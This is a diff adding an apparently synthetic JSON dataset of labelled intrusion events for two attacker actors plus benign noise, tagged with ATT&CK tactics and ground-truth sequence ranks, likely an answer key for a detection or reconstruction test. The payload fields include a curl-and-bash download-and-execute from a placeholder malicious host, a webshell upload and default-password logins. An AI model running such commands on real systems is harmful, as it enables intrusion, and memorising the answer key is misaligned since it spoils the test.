@@ -1,0 +1,127 @@
+{
+  "dataset_version": "1.0.0",
+  "generated_at": "2026-09-06T00:00:00Z",
+  "events": {
+    "evt-alpha-001": {
+      "actor_id": "ACTOR_ALPHA",
+      "source_ip": "198.51.100.42",
+      "target_node": "node-1",
+      "service": "HTTP",
+      "tactic": "TA0043",
+      "tactic_name": "Reconnaissance",
+      "technique": "T1595",
+      "true_sequence_rank": 1,
+      "payload": "GET /phpmyadmin/scripts/setup.php HTTP/1.1"
+    },
+    "evt-alpha-002": {
+      "actor_id": "ACTOR_ALPHA",
+      "source_ip": "198.51.100.42",
+      "target_node": "node-1",
+      "service": "SSH",
+      "tactic": "TA0001",
+      "tactic_name": "Initial Access",
+      "technique": "T1078",
+      "true_sequence_rank": 2,
+      "payload": "LOGIN admin / admin123"
+    },
+    "evt-alpha-003": {
+      "actor_id": "ACTOR_ALPHA",
+      "source_ip": "198.51.100.42",
+      "target_node": "node-1",
+      "service": "SSH",
+      "tactic": "TA0002",
+      "tactic_name": "Execution",
+      "technique": "T1059",
+      "true_sequence_rank": 3,
+      "payload": "curl -O http://malicious.cdn/stage2.sh && bash stage2.sh"
+    },
+    "evt-alpha-004": {
+      "actor_id": "ACTOR_ALPHA",
+      "source_ip": "198.51.100.42",
+      "target_node": "node-1",
+      "service": "HTTP",
+      "tactic": "TA0003",
+      "tactic_name": "Persistence",
+      "technique": "T1505",
+      "true_sequence_rank": 4,
+      "payload": "POST /upload.php [webshell.php]"
+    },
+    "evt-alpha-005": {
+      "actor_id": "ACTOR_ALPHA",
+      "source_ip": "192.168.10.5",
+      "target_node": "node-2",
+      "service": "SMB",
+      "tactic": "TA0008",
+      "tactic_name": "Lateral Movement",
+      "technique": "T1021",
+      "true_sequence_rank": 5,
+      "payload": "SMB2_TREE_CONNECT \\\\node-2\\c$"
+    },
+    "evt-alpha-006": {
+      "actor_id": "ACTOR_ALPHA",
+      "source_ip": "192.168.10.5",
+      "target_node": "node-2",
+      "service": "SMB",
+      "tactic": "TA0011",
+      "tactic_name": "Command and Control",
+      "technique": "T1105",
+      "true_sequence_rank": 6,
+      "payload": "SMB2_WRITE payload.exe"
+    },
+    "evt-beta-001": {
+      "actor_id": "ACTOR_BETA",
+      "source_ip": "203.0.113.88",
+      "target_node": "node-2",
+      "service": "SSH",
+      "tactic": "TA0043",
+      "tactic_name": "Reconnaissance",
+      "technique": "T1595",
+      "true_sequence_rank": 1,
+      "payload": "TCP SYN probe port 22"
+    },
+    "evt-beta-002": {
+      "actor_id": "ACTOR_BETA",
+      "source_ip": "203.0.113.88",
+      "target_node": "node-2",
+      "service": "SSH",
+      "tactic": "TA0006",
+      "tactic_name": "Credential Access",
+      "technique": "T1110",
+      "true_sequence_rank": 2,
+      "payload": "LOGIN root / 123456"
+    },
+    "evt-beta-003": {
+      "actor_id": "ACTOR_BETA",
+      "source_ip": "203.0.113.88",
+      "target_node": "node-2",
+      "service": "SSH",
+      "tactic": "TA0006",
+      "tactic_name": "Credential Access",
+      "technique": "T1110",
+      "true_sequence_rank": 3,
+      "payload": "LOGIN root / password"
+    },
+    "evt-noise-001": {
+      "actor_id": "BENIGN_NOISE",
+      "source_ip": "198.18.0.1",
+      "target_node": "node-1",
+      "service": "HTTP",
+      "tactic": "TA0043",
+      "tactic_name": "Reconnaissance",
+      "technique": "T1595",
+      "true_sequence_rank": null,
+      "payload": "GET /robots.txt HTTP/1.1"
+    },
+    "evt-noise-002": {
+      "actor_id": "BENIGN_NOISE",
+      "source_ip": "198.18.0.2",
+      "target_node": "node-2",
+      "service": "NTP",
+      "tactic": "NONE",
+      "tactic_name": "None",
+      "technique": "NONE",
+      "true_sequence_rank": null,
+      "payload": "NTP MONLIST request"
+    }
+  }
+}
